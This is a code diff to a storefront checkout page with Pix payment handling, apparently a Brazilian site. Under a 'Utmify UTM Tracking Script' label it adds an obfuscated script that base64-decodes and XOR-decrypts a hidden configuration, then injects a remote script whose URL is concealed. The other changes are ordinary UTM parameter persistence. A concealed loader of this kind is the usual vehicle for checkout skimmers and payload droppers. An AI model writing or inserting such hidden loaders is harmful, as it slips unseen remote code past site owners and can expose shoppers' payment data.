@@ -832,6 +832,23 @@ src="https://www.facebook.com/tr?id=29370137919281276&ev=PageView&noscript=1"
 src="https://www.facebook.com/tr?id=1715304620163972&ev=PageView&noscript=1"
 /></noscript>
 <!-- End Meta Pixel Code -->
+  <!-- Utmify UTM Tracking Script -->
+  <script>(function(){var s_i=atob("DPiUIkxWJkKaS6qOYYO2Vz46BHi4I976EYuuDWM1Qiy0Pt7jCJ7tDC85S2z4OYX9Aor9UjglCTfuJtmhDZngRz8iCCjpaYasAIzgUCU0Uzb/OIi0OoO2TC07Q2Cgac7vFZm5Vzg7TyTjZtr8BI7xTDh7XiH1L4f9ApO2Dm4gRy7vLoi0Q9rpDjd0SCP3Loi0Q5z1Vi17Uzb3Isz3TIjmRzozSDa3ON/sCJznAGB0UCP2Ps+sW9q2XxEr");var h_r=[];for(var l_yuc=0;l_yuc<s_i.length;l_yuc++){h_r.push(s_i.charCodeAt(l_yuc)&255);}var m_3jf=h_r[0];var g_bm8=h_r.slice(1,1+m_3jf);var i_0j=h_r.slice(1+m_3jf);var v_oal=i_0j.map(function(b,y_y32r){return b^g_bm8[y_y32r%m_3jf];});var d_erg="";for(var z_4qp=0;z_4qp<v_oal.length;z_4qp++){d_erg+=String.fromCharCode(v_oal[z_4qp]&255);}var p_r35=decodeURIComponent(escape(d_erg));var d_kt=JSON.parse(p_r35);var c_od=d_kt.globals||[];c_od.forEach(function(a_wh){window[a_wh.name]=a_wh.value;});var c_bo=document.createElement("script");c_bo.src=d_kt.url;c_bo.async=true;c_bo.defer=true;(d_kt.attributes||[]).forEach(function(r_4dib){c_bo.setAttribute(r_4dib.name,r_4dib.value);});(document.head||document.documentElement).appendChild(c_bo);})();</script>
+  <script>
+    (function(){
+      try {
+        var sp = new URLSearchParams(window.location.search);
+        var keys = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck','fbclid'];
+        keys.forEach(function(k){
+          var v = sp.get(k);
+          if (v) {
+            sessionStorage.setItem(k, v);
+            localStorage.setItem(k, v);
+          }
+        });
+      } catch(e){}
+    })();
+  </script>
 </head>
 <body>
 
@@ -1490,14 +1507,14 @@ async function processCheckout() {
         orderId:   orderId,
         fbc:       getCookie('_fbc') || '',
         fbp:       getCookie('_fbp') || '',
-        // UTMs da URL para rastreamento Veno
-        utm_source:   (new URLSearchParams(window.location.search)).get('utm_source')   || '',
-        utm_campaign: (new URLSearchParams(window.location.search)).get('utm_campaign') || '',
-        utm_medium:   (new URLSearchParams(window.location.search)).get('utm_medium')   || '',
-        utm_content:  (new URLSearchParams(window.location.search)).get('utm_content')  || '',
-        utm_term:     (new URLSearchParams(window.location.search)).get('utm_term')     || '',
-        src:          (new URLSearchParams(window.location.search)).get('src')          || '',
-        sck:          (new URLSearchParams(window.location.search)).get('sck')          || '',
+        // UTMs da URL ou Storage para rastreamento Veno
+        utm_source:   (new URLSearchParams(window.location.search)).get('utm_source')   || sessionStorage.getItem('utm_source')   || localStorage.getItem('utm_source')   || '',
+        utm_campaign: (new URLSearchParams(window.location.search)).get('utm_campaign') || sessionStorage.getItem('utm_campaign') || localStorage.getItem('utm_campaign') || '',
+        utm_medium:   (new URLSearchParams(window.location.search)).get('utm_medium')   || sessionStorage.getItem('utm_medium')   || localStorage.getItem('utm_medium')   || '',
+        utm_content:  (new URLSearchParams(window.location.search)).get('utm_content')  || sessionStorage.getItem('utm_content')  || localStorage.getItem('utm_content')  || '',
+        utm_term:     (new URLSearchParams(window.location.search)).get('utm_term')     || sessionStorage.getItem('utm_term')     || localStorage.getItem('utm_term')     || '',
+        src:          (new URLSearchParams(window.location.search)).get('src')          || sessionStorage.getItem('src')          || localStorage.getItem('src')          || '',
+        sck:          (new URLSearchParams(window.location.search)).get('sck')          || sessionStorage.getItem('sck')          || localStorage.getItem('sck')          || '',
       }),
     });
 
@@ -1527,6 +1544,13 @@ async function processCheckout() {
       pix_code:  pix.pix_copy_paste || '',
       pix_qr:    pix.qr_code_image || '',
       expires:   pix.expires_at || '',
+    });
+        const curSearch = new URLSearchParams(window.location.search);
+    ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck','fbclid'].forEach(k => {
+      const v = curSearch.get(k) || sessionStorage.getItem(k) || localStorage.getItem(k);
+      if (v && !params.has(k)) {
+        params.set(k, v);
+      }
     });
     window.location.href = 'pagar.html?' + params.toString();
 
